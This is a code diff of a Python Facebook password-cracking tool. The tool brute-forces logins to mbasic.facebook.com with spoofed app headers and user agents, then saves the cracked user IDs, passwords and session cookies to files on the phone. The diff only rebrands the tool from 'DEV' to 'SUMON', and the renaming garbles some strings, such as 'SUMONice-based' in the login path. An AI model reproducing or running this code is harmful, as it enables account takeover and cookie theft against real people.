                 'credentials_type': 'password',
                 'source': 'login',
                 'error_detail_type': 'button_with_disabled',
@@ -2183,7 +2163,7 @@ def d(uid,pwx,tl):
                 'X-FB-Connection-Type': 'WIFI',
                 'X-Tigon-Is-Retry': 'False',
                 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
-                'x-fb-device-group': '5120',
+                'x-fb-SUMONice-group': '5120',
                 'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                 'X-FB-Request-Analytics-Tags': 'graphservice',
                 'X-FB-HTTP-Engine': 'Liger',
@@ -2202,13 +2182,13 @@ def d(uid,pwx,tl):
                 except:
                     uid = uid
                 if result["is_account_confirmed"] == False:
-                    print(f" {green}[DEV-OK] {uid}|{pw}")
+                    print(f" {green}[SUMON-OK] {uid}|{pw}")
                    #print(f" {green}[COOKIES] {red}{coki}")
-                    open("/sdcard/dev-novery.txt", "a").write(f"{uid}|{pw}|{coki}\n")
+                    open("/sdcard/SUMON-novery.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                 else:
-                    print(f" {green}[DEV-OK] {uid}|{pw}")
+                    print(f" {green}[SUMON-OK] {uid}|{pw}")
                    #print(f" {white}[COOKIES] {green}{coki}")
-                    open("/sdcard/deV_random_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
+                    open("/sdcard/SUMON_random_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                     oks.append(uid)
                     break
             else:
@@ -2224,7 +2204,7 @@ def cracker(uid, pwx, tl):
     global cps
     global twf
     global loop
-    sys.stdout.write(f"\r {green}(DEV) ({loop}) (OK-{len(oks)})\r"),
+    sys.stdout.write(f"\r {green}(SUMON) ({loop}) (OK-{len(oks)})\r"),
     sys.stdout.flush()
     try:
         first6digit = uid[0:6]
@@ -2419,7 +2399,7 @@ def cracker(uid, pwx, tl):
                 "Mozilla/5.0 (Linux; U; Android 8.0.0; en-US; SM-A730F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 Mobile Safari/537.36 [FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
             ])
             ua = random.choice(uas)
-            pro = random.choice(devua)
+            pro = random.choice(SUMONua)
             ses = requests.Session()
             p_fb = ses.get("https://mbasic.facebook.com").text
             lsd = re.search('name="lsd" value="(.*?)"', str(p_fb)).group(1)
@@ -2440,7 +2420,7 @@ def cracker(uid, pwx, tl):
             headers = {
             'Host': 'mbasic.facebook.com',
             'method': 'POST',
-            'path': '/login/device-based/login/async/',
+            'path': '/login/SUMONice-based/login/async/',
             'scheme': 'https',
             'content-length': '294',
             'Accept-Encoding': 'gzip',
@@ -2478,12 +2458,12 @@ def cracker(uid, pwx, tl):
                 check = check_lock(cid)
                 if "live" in check:
                     if '%3A-1%3A-1' in coki:
-                        print(f" {cyan}(DEV-2F) {cid}|{pw} ")
+                        print(f" {cyan}(SUMON-2F) {cid}|{pw} ")
                         break
                     else:
-                        print(f" {green}(DEV-OK) {cid}|{pw} ")
+                        print(f" {green}(SUMON-OK) {cid}|{pw} ")
                        #print(f" {white}Cookie : {green}{coki}")
-                        open("/sdcard/Dev-Number-ok.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                        open("/sdcard/SUMON-Number-ok.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                         oks.append(cid)
                         break
                 else:
@@ -2491,8 +2471,8 @@ def cracker(uid, pwx, tl):
             elif 'checkpoint' in response:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[141:156]
-                #print('\33[1;91m[DEV-CP] '+uid+' | '+pw+'\33[0;97m')
-                open('/sdcard/Dev-Cp.txt', 'a').write(uid+' | '+pw+'\n')
+                #print('\33[1;91m[SUMON-CP] '+uid+' | '+pw+'\33[0;97m')
+                open('/sdcard/SUMON-Cp.txt', 'a').write(uid+' | '+pw+'\n')
                 cps.append(uid)
                 break
             else:
